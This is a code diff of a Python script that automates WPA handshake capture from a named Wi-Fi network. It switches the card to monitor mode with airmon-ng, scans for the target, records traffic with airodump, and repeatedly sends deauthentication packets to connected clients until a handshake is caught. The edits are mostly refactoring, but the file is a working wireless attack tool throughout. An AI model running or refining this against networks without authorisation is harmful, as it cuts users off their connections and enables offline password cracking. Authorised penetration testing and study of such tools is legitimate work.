@@ -11,10 +11,10 @@ from termcolor import colored           # some colors for ya
 parser = argparse.ArgumentParser(description='Automatically capture handshake')
 parser.add_argument('ssid', metavar='network_name', help='Network name')
 parser.add_argument('-i', metavar='interface', default='', help='Interface')
-parser.add_argument('--conf', metavar='confidence', default=0.6, help='Confidence in guessing network name (default = 0.6)')
+parser.add_argument('--conf', metavar='confidence',type=float, default=0.6, help='Confidence in guessing network name (default = 0.6)')
 parser.add_argument('--pAm', metavar='packets', type=int, default=10, help='Amount of packets to send (default = 5)')
 parser.add_argument('--dir', metavar='directory', default='', help='Directory (default = mydir/wifis/network_name)')
-parser.add_argument('--mode', metavar='mode', default='', help='Set to pi if you are using raspberry')
+parser.add_argument('--mode', metavar='mode', default='', help='Set to pi if you are using raspberry (Raspbian OS, or if you do not use network manager)')
 
 args = parser.parse_args()
 # Parsed values ------------------- End
@@ -22,11 +22,8 @@ args = parser.parse_args()
 
 # Global variables ------------------------- Start
 Interface = args.i
-
 SSID = args.ssid
-
 Confidence = args.conf  # How confident script must be in guessing network name
-
 DeauthPacketsAmount = args.pAm
 
 MY_DIRECTORY = os.popen('pwd').read()
@@ -34,9 +31,9 @@ SaveTo = f'{MY_DIRECTORY[:-1]}/wifis/'
 if args.dir != '':
 	SaveTo = args.dir
 
-isNotPi = True
+isPi = False
 if args.mode == 'pi':
-	isNotPi = False
+	isPi = True
 # Global variables ------------------------- End
 
 
@@ -45,10 +42,10 @@ def select_interface(interface_name):
 	Interfaces = []
 	InterfaceIndex = type(int)
 
-	command_set_interface_up = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
-	interfaces = os.popen(command_set_interface_up).read().split("\n")[:-1]
+	command_find_interfaces = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
+	interfaces = os.popen(command_find_interfaces).read().split("\n")[:-1]
 	if len(interfaces) < 3:
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No interfaces', flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No interfaces')
 		sys.exit()
 	index = 0
 	for interface in interfaces:
@@ -62,7 +59,7 @@ def select_interface(interface_name):
 	if interface_name in Interfaces and args.i != "":
 		return interface_name
 	if interface_name not in Interfaces and args.i != "":
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + f'] No such interface {interface_name}', flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + f'] No such interface {interface_name}')
 		sys.exit()
 
 	if len(Interfaces) > 1:
@@ -77,20 +74,18 @@ def select_interface(interface_name):
 			if len(Interfaces) > InterfaceIndex:
 				return Interfaces[InterfaceIndex]
 			else:
-				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] You picked the wrong house fool', flush=True)
+				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] You picked the wrong house fool')
 	else:
 		InterfaceIndex = 0
 		return Interfaces[0]
 
 
-def update_interface_name(interface_name, enable_monitor_mode):
-	interface = interface_name
-	if enable_monitor_mode:
-		interface += "mon"
-		return interface
-	else:
-		interface = interface[:-3]
-		return interface
+def get_name_by_phy(interface_phy_id):
+	return os.popen(f"sudo airmon-ng | egrep {interface_phy_id} |" + " awk '{print $2}'").read()[:-1]
+
+
+def get_phy_by_name(interface_name):
+	return os.popen(f"sudo airmon-ng | egrep {interface_name} |" + " awk '{print $1}'").read()[:-1]
 
 
 def monitor_mode(interface_name):
@@ -106,36 +101,33 @@ def start_network_manager():
 	command_network_manager_start = 'dbus-run-session sudo systemctl start NetworkManager'
 	os.popen(command_network_manager_start).read()
 
-def check_network_manager():
-	command_network_manager_start = "systemctl status NetworkManager | grep -a Active | awk '{print $2}'"
-	if os.popen(command_network_manager_start).read() == active:
-		return True
-	return False
 
-
-def start_airmon(interface_name, supports_network_manager):
-	if supports_network_manager:
-		output_airmon_check_kill = os.popen("sudo airmon-ng check kill").read()
-	command_airmon_start = f"sudo airmon-ng start {interface_name}"
-	output_airmon_start = os.popen(command_airmon_start).read()
-	interface = update_interface_name(interface_name, True)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface}', flush=True)
-	return interface
+def start_airmon(interface_name, kill_wifi):
+	if kill_wifi:
+		os.popen("sudo airmon-ng check kill").read()
+	interface_phy = get_phy_by_name(interface_name)
+	os.popen(f"sudo airmon-ng start {interface_name}").read()
+	interface_new = get_name_by_phy(interface_phy)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface_new}')
+	return interface_new
 
 
 def stop_airmon(interface_name):
-	command_airmon_stop = f"sudo airmon-ng stop '{interface_name}'"
-	os.popen(command_airmon_stop).read()
-	interface = update_interface_name(interface_name, False)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface}', flush=True)
-	return interface
+	interface_phy = get_phy_by_name(interface_name)
+	os.popen(f"sudo airmon-ng stop '{interface_name}'").read()
+	interface_new = get_name_by_phy(interface_phy)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface_new}')
+	return interface_new
 
 
 def get_network_info(interface_name, network_name, guessing_confidence):
 	BSSID = ''
 	Channel = ''
-	command_scan_wifi = f'''sudo iwlist {interface_name} scan | egrep "ESSID:|Address:|Channel:" | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' '''
-	output_scan_wifi = os.popen(command_scan_wifi).read()
+	output_scan_wifi = os.popen(f'''sudo iwlist {interface_name} scan | egrep "ESSID:|Address:|Channel:" | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' 2>&1''').read()
+	#if(output_scan_wifi == "wlan0     Failed to read scan data : Resource temporarily unavailable\n" or output_scan_wifi == "wlan0     Interface doesn't support scanning : Device or resource busy"):
+	#	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] wlan0     Failed to read scan data : Resource temporarily unavailable. Disconnecting any network might help.', )
+	#	sys.exit()
+		
 	splited_output_scan_wifi = output_scan_wifi.split("\n")
 	if not splited_output_scan_wifi:
 		time.sleep(5)
@@ -145,7 +137,7 @@ def get_network_info(interface_name, network_name, guessing_confidence):
 	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]
 
 	if not splited_output_scan_wifi:
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No networks found', flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No networks found')
 		sys.exit()
 
 	wifiNames = []
@@ -166,10 +158,10 @@ def get_network_info(interface_name, network_name, guessing_confidence):
 		closeMatch = get_close_matches(network_name, wifiNames, 1, Confidence)[0]
 		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
 		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + f"] No such network '{network_name}', assuming you typed '{closeMatch}'", flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + f"] No such network '{network_name}', assuming you typed '{closeMatch}'")
 		return [closeMatch, BSSID, Channel]
 	except IndexError:
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Error scanning for network (network name is incorrect)', flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Error scanning for network (network name is incorrect)')
 		sys.exit()
 
 
@@ -252,7 +244,7 @@ def check_for_stations(directory):
 			stations = fill_stations_from_csv(directory)
 			if len(stations) > 0:
 				current_station_address = select_station(stations, '')
-				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Stations: {stations}', flush=True)
+				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Stations: {stations}')
 				return stations, current_station_address
 		index += 1
 		time.sleep(3.0 - ((time.time() - startTime) % 3.0))
@@ -260,54 +252,52 @@ def check_for_stations(directory):
 
 
 # MAIN ---------------------------------- Start
-def recieveHandshake(interface_name, network_name, guessing_confidence, deauth_packets, directory, supports_network_manager):
+def recieveHandshake(interface_name, network_name, directory, guessing_confidence = 0.6, deauth_packets = 10, kill_wifi = True):
 	if monitor_mode(interface_name):
 		interface_name = stop_airmon(interface_name)
-		if supports_network_manager:
+		if kill_wifi:
 			start_network_manager()
-			while check_network_manager == False:
-				time.sleep(5)
+			time.sleep(5)
 	NetworkName, BSSID, Channel = get_network_info(interface_name, network_name, guessing_confidence)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] [SSID: {NetworkName}] [BSSID: {BSSID}] [Channel: {Channel}]', flush=True)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] [SSID: {NetworkName}] [BSSID: {BSSID}] [Channel: {Channel}]')
 	Directory = make_directory(directory, NetworkName)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Directory: {Directory}', flush=True)
-	interface_name = start_airmon(interface_name, supports_network_manager)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Directory: {Directory}')
+	interface_name = start_airmon(interface_name, kill_wifi)
 	start_airodump(interface_name, BSSID, Channel, Directory)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Waiting for station...', flush=True)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Waiting for station...')
 	time.sleep(1)
 	Stations = []
 	CurrentStation = ''
 	Stations, CurrentStation = check_for_stations(Directory)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}', flush=True)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}')
 	deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
 	cyclesCount = 0
 	while check_handshake(Directory)[1] is False:
 		if check_handshake(Directory)[2] == "Corrupted file":
-			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Capture file is currupted. Please restart the script', flush=True)
+			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Capture file is currupted. Please restart the script')
 			interface_name = stop_airmon(interface_name)
-			if supports_network_manager:
+			if kill_wifi:
 				start_network_manager()
-		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] Failure', flush=True)
+		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] Failure')
 		if len(Stations) > 0 and cyclesCount < len(Stations):
-			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Selecting another station', flush=True)
+			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Selecting another station')
 			CurrentStation = select_station(Stations, CurrentStation)
-			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}', flush=True)
+			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}')
 			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
 			cyclesCount += 1
 		else:
-			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Rescanning stations...', flush=True)
+			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Rescanning stations...')
 			Stations, CurrentStation = check_for_stations(Directory)
-			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}', flush=True)
+			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}')
 			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
 			cyclesCount = 1
 	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue', attrs=['bold']) + '] [' + colored('INFO', 'green', attrs=['bold']) + '] ' + colored('Success!', attrs=['bold']))
 	interface_name = stop_airmon(interface_name)
-	if supports_network_manager:
+	if kill_wifi:
 		start_network_manager()
 
 if __name__ == "__main__":
 	Interface = select_interface(Interface)
-	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Interface: {Interface}', flush=True)
-	time.sleep(2)
-	recieveHandshake(Interface, SSID, Confidence, DeauthPacketsAmount, SaveTo, isNotPi)
+	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Interface: {Interface}')
+	recieveHandshake(Interface, SSID, SaveTo, Confidence, DeauthPacketsAmount, not isPi)
 # MAIN ---------------------------------- END
